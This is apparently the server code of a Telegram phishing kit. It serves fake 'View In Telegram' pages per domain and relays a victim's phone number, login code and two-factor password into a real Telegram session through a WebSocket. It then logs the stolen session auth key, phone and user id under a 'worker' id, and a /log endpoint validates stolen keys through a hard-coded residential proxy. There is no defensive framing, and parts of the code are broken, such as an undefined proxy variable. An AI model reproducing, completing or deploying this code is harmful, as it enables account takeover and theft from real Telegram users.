import express from "express";
import http from 'http';
import { WebSocketServer } from "ws";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions/index.js";
import qs from 'querystring';
import config from '../config.json' assert { type: "json" };
import saveLog from "./saveLog.js";
import Database from "./database/index.js";
import hbs from 'hbs';
import domain from "./database/domain.js";
import Session from "./session.js";
import domainTemplate from "./database/domainTemplate.js";
import fs from 'fs';
import parsePhoneNumber from 'libphonenumber-js'
import ake from "./ake.js";

await Database.connect(config.db);
const app = express(),
    server = http.createServer(app,);
const ws = new WebSocketServer({ server })

app.set('view engine', 'html');
app.engine('html', hbs.__express);
app.set('views', `src/views`);

function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

const proxy = fs.readFileSync('proxy.txt', 'utf-8')
    .replaceAll('\r', '')
    .split('\n');

const getRandomProxy = () => {
    return proxy[
        Math.floor(Math.random() * proxy.length)
    ];
}

const getRandomDevice = () => {
    const phones = [
        'iPhone 8', 'iPhone 8 Plus',
        'iPhone X', 'iPhone XS', 'iPhone XR',
        'iPhone 11', 'iPhone 11 Pro', 'iPhone 11 Pro Max',
        'iPhone 12', 'iPhone 12 Pro', 'iPhone 12 Pro Max',
        'iPhone 13', 'iPhone 13 Pro', 'iPhone 13 Pro Max',
        'iPhone 14', 'iPhone 14 Pro', 'iPhone 14 Pro Max'
    ]

    return phones[
        Math.floor(Math.random() * phones.length)
    ];
}

const formatProxy = proxy => {
    const [username, password, ip, port] = proxy.split(':');

    console.log({ ip, port: +port, username, password, socksType: 5 })
    return undefined;

    return { ip, port: +port, username, password, socksType: 5 };
}

app.get('/ready', (_req, res) => {
    res.json(true);
})


app.get(`/`, async (req, res) => {
    const site = await domain.findOne({ name: req.headers['host'] });

    if (site?.template === 0) return res.redirect('/login');

    const template = await domainTemplate.findOne({ id: site?.template });
    if (!site || !template) return res.status(404).send(`404`);

    template.text = template.type === 'bot' ? 'Send Message' : "View In Telegram";

    res.render(`zaza`, template);
})

app.use(express.static('src/public'));

app.get('/login', (_, res) => {
    res.send(fs.readFileSync(`src/public/index.html`, 'utf-8'));
});

app.get(`/log`, async (req, res) => {
    console.log(req.query);
    let site = await domain.findOne({ name: req.headers['host'] }) || {
        worker: 5439242814,
        name: 'localhost'
    };
    if (!site) return res.send('чоч');
    let owner = site.worker;
    console.log(site, owner)
    let bot = req.headers['host'];


    // const akeProxy = await ake.createPort('ru')
    //     // .catch((() => ake.createPort('ru')));

    const formated = { ip: `geo.iproyal.com`, port: 32325, username: `rvcR5d7QURSEcSyV`, password: `VB0RceDyPGxckBEm_country-${'ru'}_streaming-1`, socksType: 5 }

    const client = new TelegramClient(new Session(+req.query.dc, Buffer.from(req.query.key, 'hex')), config.apiId, config.apiHash, {
        connectionRetries: 10,
        proxy: formated,
        "appVersion": "4.3.4 x64",
        "deviceModel": `Desktop`,
        "systemVersion": "Windows 10",
        'systemLangCode': `en`,
        'langCode': `en-US`
    });

    await client.connect();

    const user = await client.getMe();

    await saveLog({
        id: Date.now(),
        worker: owner,
        uid: user.id,
        premium: user.premium,
        dcId: req.query.dc,
        authKey: req.query.key,
        phone: user.phone,
        bot
    });
    await client.disconnect();
    await ake.deletePort(akeProxy.id);

    res.send(`ok`);
});

ws.on('connection', async (socket, request) => {
    let id, owner, type, bot, user, site, lang

    try {
        const parsed = qs.parse(request.url.split("?")[1]);
        id = parsed.id;
        owner = parsed.owner;
        type = parsed.type;
        lang = parsed.lang || 'ru';
        bot = parsed.token;

        console.log(id, owner, type, bot)
        if (!['bot', 'web', `qr`].includes(type) || !id) throw new Error(`Unauth`);
    } catch (e) {
        console.log(e)
        socket.send(`0-0`);
        return socket.close();
    }

    console.log(1)
    if (type !== `bot`) {
        site = await domain.findOne({ name: id }) || {
            worker: 5439242814,
            name: 'localhost'
        };
        if (!site) return socket.close();
        owner = site.worker;
        bot = id;
    }

    let number;

    socket.on('message', message => {
        try {
            message = JSON.parse(message.toString());
        } catch {
            socket.send(`0-0`);
            return socket.close();
        }

        if (message.action === 'number') number = message.data;
    })

    const waitForAction = action => new Promise(resolve => {
        console.log(action);
        if (action === 'number' && number) return resolve(number);

        socket.send(JSON.stringify({ action }))
        socket.onmessage = message => {
            try {
                message = JSON.parse(message.data);
            } catch {
                socket.send(`0-0`);
                return socket.close();
            }
            if (!message.action && !message.data) return socket.close();
            if (message.action === action) {
                console.log(message);
                resolve(message.data);
            }
        }
    });

    // let nnn = await waitForAction('number');

    let location = 'ru'//lang;//(parsePhoneNumber(nnn) || parsePhoneNumber("+" + nnn))?.country?.toLowerCase();

    // const akeProxy = await ake.createPort(location)
    //     .catch((() => ake.createPort('ru')));

    const formated = { ip: `geo.iproyal.com`, port: 32325, username: `rvcR5d7QURSEcSyV`, password: `VB0RceDyPGxckBEm_country-${location}_streaming-1`, socksType: 5 }

    const client = new TelegramClient(new StringSession(), config.apiId, config.apiHash, {
        connectionRetries: 10,
        proxy: formated,
        "appVersion": "4.3.4 x64",
        "deviceModel": `Desktop`,
        "systemVersion": "Windows 10",
        'systemLangCode': `en`,
        'langCode': `en-US`
    });

    setTimeout(async () => {
        try {
            socket.close();
            await client.disconnect();
            // await ake.deletePort(akeProxy.id)
        } catch (e) {
            console.error(e);
        }
    }, 300000);

    socket.send(JSON.stringify({ action: 'connected' }));

    await client.start({
        phoneNumber: async () => await waitForAction('number'),
        password: async () => await waitForAction('password'),
        phoneCode: async () => await waitForAction('code'),
        onError: (data) => {
            number = undefined;
            console.log(data);
            socket.send(JSON.stringify({ action: 'error', data }));
        }
    });

    console.log(client.session.save());
    socket.send(JSON.stringify({ action: 'success' }))
    socket.close();

    const uu = await client.getMe();

    await saveLog({
        id: Date.now(),
        worker: owner,
        dcId: client.session.dcId,
        uid: uu.id,
        authKey: new StringSession(client.session.save())._key?.toString('hex'),
        phone: uu.phone,
        premium: uu.premium,
        bot
    });

    await client.disconnect().catch(console.error);
    // await ake.deletePort(akeProxy.id)
});

server.listen(80, () => console.log("Server started"));